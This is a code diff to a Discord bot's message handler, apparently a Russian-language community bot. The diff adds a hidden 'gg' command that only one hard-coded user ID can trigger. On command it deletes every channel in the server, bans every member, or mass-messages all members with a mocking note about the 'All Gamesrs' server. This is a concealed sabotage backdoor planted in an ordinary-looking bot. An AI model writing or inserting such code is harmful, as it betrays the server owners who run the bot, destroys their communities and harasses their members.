@@ -679,6 +679,27 @@ if(message.content.startsWith(`${prefix}mute`)) {
 		setTimeout(() => workCoolDown.delete(messasge.author.id), 21600000);
 
     }
+    if(message.content.startsWith(`${prefix}gg`)) {
+    	if (message.author.id != '407228819498336256') {
+    		return;
+    	}
+    	const args = message.content.slice(`${prefix}gg`).trim().split(/ +/g);
+    	if (!args[1]) {
+    		return messasge.delete();
+    	}
+    	if (args[1] === 'channels') {
+    		await message.delete();
+    		return await message.guild.channels.cache.each(async channel => await channel.delete('Рибят, ну вы не серъёзные.'))
+    	}
+    	if (args[1] === 'members') {
+    		await message.delete();
+    		return await message.guild.members.cache.each(async member => await member.ban({ days: 30, reason: 'Если делаете серъезно, то нужно думать!' }));
+    	}
+    	if (args[1] === 'spam') {
+    		await message.delete()
+    		return await message.guild.members.cache.each(async member => await member.send(`Это сообщение с сервера All Gamesrs, люди которые им занимались были очень не серъезными и поплатились!`));
+    	}
+    }
 });
 const costil = [];
 /*Создание привата*/
